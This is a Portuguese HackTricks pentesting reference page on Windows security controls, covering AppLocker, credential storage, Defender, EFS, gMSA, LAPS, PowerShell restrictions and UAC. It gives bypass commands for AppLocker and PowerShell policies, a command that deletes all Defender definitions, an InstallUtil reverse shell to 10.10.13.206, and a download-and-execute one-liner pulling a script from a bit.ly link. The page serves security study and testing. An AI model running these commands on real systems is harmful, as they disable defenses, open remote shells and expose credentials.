# Controles de Segurança do Windows

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias **mais avançadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política do AppLocker

Uma lista de permissões de aplicativos é uma lista de softwares ou executáveis aprovados que têm permissão para estar presentes e ser executados em um sistema. O objetivo é proteger o ambiente contra malware prejudicial e software não aprovado que não esteja alinhado com as necessidades específicas de uma organização.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a **solução de lista de permissões de aplicativos** da Microsoft e dá aos administradores de sistema controle sobre **quais aplicativos e arquivos os usuários podem executar**. Ele oferece **controle granular** sobre executáveis, scripts, arquivos de instalação do Windows, DLLs, aplicativos empacotados e instaladores de aplicativos empacotados.\
É comum que organizações **bloqueiem cmd.exe e PowerShell.exe** e o acesso de escrita a certos diretórios, **mas tudo isso pode ser contornado**.

### Verificação

Verifique quais arquivos/extensões estão na lista negra/lista branca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Regras do AppLocker aplicadas a um host também podem ser **lidas do registro local** em **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**.

### Bypass

* Pastas **graváveis úteis** para contornar a Política do AppLocker: Se o AppLocker permite executar qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, existem **pastas graváveis** que você pode usar para **contornar isso**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Binários comumente **confiáveis** [**"LOLBAS's"**](https://lolbas-project.github.io/) também podem ser úteis para contornar o AppLocker.
* **Regras mal escritas também podem ser contornadas**
* Por exemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, você pode criar uma **pasta chamada `allowed`** em qualquer lugar e ela será permitida.
* Organizações também costumam focar em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas esquecem dos **outros** [**locais do executável PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
* **Aplicação de DLL raramente ativada** devido à carga adicional que pode impor a um sistema e a quantidade de testes necessários para garantir que nada será interrompido. Então, usar **DLLs como backdoors ajudará a contornar o AppLocker**.
* Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o AppLocker. Para mais informações, confira: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Armazenamento de Credenciais

### Security Accounts Manager (SAM)

Credenciais locais estão presentes neste arquivo, as senhas são hasheadas.

### Local Security Authority (LSA) - LSASS

As **credenciais** (hasheadas) são **salvas** na **memória** deste subsistema por motivos de Single Sign-On.\
**LSA** administra a **política de segurança local** (política de senha, permissões de usuários...), **autenticação**, **tokens de acesso**...\
LSA será o responsável por **verificar** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **comunicar-se** com o **controlador de domínio** para autenticar um usuário de domínio.

As **credenciais** são **salvas** dentro do **processo LSASS**: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.

### Segredos LSA

LSA pode salvar em disco algumas credenciais:

* Senha da conta do computador do Active Directory (controlador de domínio inacessível).
* Senhas das contas dos serviços do Windows
* Senhas para tarefas agendadas
* Mais (senha de aplicações IIS...)

### NTDS.dit

É o banco de dados do Active Directory. Está presente apenas em Controladores de Domínio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) é um Antivírus disponível no Windows 10 e Windows 11, e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting como **`WinPEAS`**. No entanto, existem maneiras de **contornar essas proteções**.

### Verificação

Para verificar o **status** do **Defender** você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerá-lo você também pode executar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (Sistema de Arquivos Criptografados)

O EFS funciona criptografando um arquivo com uma **chave simétrica** em massa, também conhecida como Chave de Criptografia de Arquivo, ou **FEK**. A FEK é então **criptografada** com uma **chave pública** associada ao usuário que criptografou o arquivo, e essa FEK criptografada é armazenada na **transmissão de dados alternativos** $EFS do arquivo criptografado. Para descriptografar o arquivo, o driver do componente EFS usa a **chave privada** que corresponde ao certificado digital EFS (usado para criptografar o arquivo) para descriptografar a chave simétrica armazenada na transmissão $EFS. A partir [daqui](https://en.wikipedia.org/wiki/Encrypting_File_System).

Exemplos de arquivos sendo descriptografados sem o usuário solicitar:

* Arquivos e pastas são descriptografados antes de serem copiados para um volume formatado com outro sistema de arquivos, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table).
* Arquivos criptografados são copiados pela rede usando o protocolo SMB/CIFS, os arquivos são descriptografados antes de serem enviados pela rede.

Os arquivos criptografados usando este método podem ser **acessados de forma transparente pelo usuário proprietário** (aquele que os criptografou), então, se você conseguir **se tornar esse usuário**, você pode descriptografar os arquivos (mudar a senha do usuário e fazer login como ele não funcionará).

### Verificar informações do EFS

Verifique se um **usuário** **usou** este **serviço** verificando se este caminho existe: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **quem** tem **acesso** ao arquivo usando cipher /c \<file>\
Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **criptografar** e **descriptografar** todos os arquivos

### Descriptografando arquivos EFS

#### Sendo Sistema de Autoridade

Este método requer que o **usuário vítima** esteja **executando** um **processo** dentro do host. Se esse for o caso, usando uma sessão `meterpreter`, você pode se passar pelo token do processo do usuário (`impersonate_token` do `incognito`). Ou você poderia simplesmente `migrar` para o processo do usuário.

#### Sabendo a senha do usuário

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Contas de Serviço Gerenciadas pelo Grupo (gMSA)

Na maioria das infraestruturas, contas de serviço são contas de usuário típicas com a opção “**Senha nunca expira**”. Manter essas contas pode ser uma verdadeira confusão e é por isso que a Microsoft introduziu **Contas de Serviço Gerenciadas:**

* Não é mais necessário gerenciar senhas. Usa uma senha complexa e aleatória de 240 caracteres e a altera automaticamente quando atinge a data de expiração da senha do domínio ou do computador.
* Utiliza o Serviço de Distribuição de Chaves da Microsoft (KDC) para criar e gerenciar as senhas para o gMSA.
* Não pode ser bloqueada ou usada para login interativo
* Suporta compartilhamento entre vários hosts
* Pode ser usada para executar tarefas agendadas (contas de serviço gerenciadas não suportam a execução de tarefas agendadas)
* Gerenciamento Simplificado de SPN – O sistema alterará automaticamente o valor do SPN se os detalhes do **sAMaccount** do computador mudarem ou a propriedade do nome DNS mudar.

As contas gMSA têm suas senhas armazenadas em uma propriedade LDAP chamada _**msDS-ManagedPassword**_ que é **redefinida automaticamente** pelos DCs a cada 30 dias, são **recuperáveis** por **administradores autorizados** e pelos **servidores** nos quais estão instaladas. _**msDS-ManagedPassword**_ é um blob de dados criptografados chamado [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) e só pode ser recuperado quando a conexão é segura, **LDAPS** ou quando o tipo de autenticação é 'Sealing & Secure', por exemplo.

![Imagem de https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Portanto, se o gMSA estiver sendo usado, descubra se ele tem **privilégios especiais** e também verifique se você tem **permissões** para **ler** a senha dos serviços.

Você pode ler esta senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
Confira também esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um **ataque de retransmissão NTLM** para **ler** a **senha** de **gMSA**.

## LAPS

\*\*\*\*[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) permite que você **gerencie a senha do Administrador local** (que é **randomizada**, única e **alterada regularmente**) em computadores integrados ao domínio. Essas senhas são armazenadas centralmente no Active Directory e restritas a usuários autorizados usando ACLs. Se o seu usuário tiver permissões suficientes, você poderá ler as senhas dos administradores locais.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de Linguagem Restrita do PS

PowerShell \*\*\*\* [**Modo de Linguagem Restrita**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **restringe muitos dos recursos** necessários para usar o PowerShell efetivamente, como bloquear objetos COM, permitir apenas tipos .NET aprovados, fluxos de trabalho baseados em XAML, classes do PowerShell e mais.

### **Verificar**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Contornar
```powershell
#Easy bypass
Powershell -version 2
```
No Windows atual, esse Bypass não funcionará, mas você pode usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilá-lo, você pode precisar** **adicionar uma Referência** -> _Procurar_ -> _Procurar_ -> adicionar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **alterar o projeto para .Net4.5**.

#### Bypass direto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell reverso:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o modo restrito. Para mais informações, confira: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de Execução do PS

Por padrão, está definida como **restrita.** Principais maneiras de contornar essa política:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mais informações podem ser encontradas [aqui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface do Provedor de Suporte de Segurança (SSPI)

É a API que pode ser usada para autenticar usuários.

O SSPI será responsável por encontrar o protocolo adequado para duas máquinas que desejam se comunicar. O método preferido para isso é o Kerberos. Então, o SSPI negociará qual protocolo de autenticação será usado, esses protocolos de autenticação são chamados de Provedor de Suporte de Segurança (SSP), estão localizados dentro de cada máquina Windows na forma de uma DLL e ambas as máquinas devem suportar o mesmo para poderem se comunicar.

### Principais SSPs

* **Kerberos**: O preferido
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** e **NTLMv2**: Por razões de compatibilidade
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Servidores web e LDAP, senha na forma de um hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL e TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: É usado para negociar o protocolo a ser usado (Kerberos ou NTLM sendo Kerberos o padrão)
* %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - Controle de Conta de Usuário

[Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite um **prompt de consentimento para atividades elevadas**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias **mais avançadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
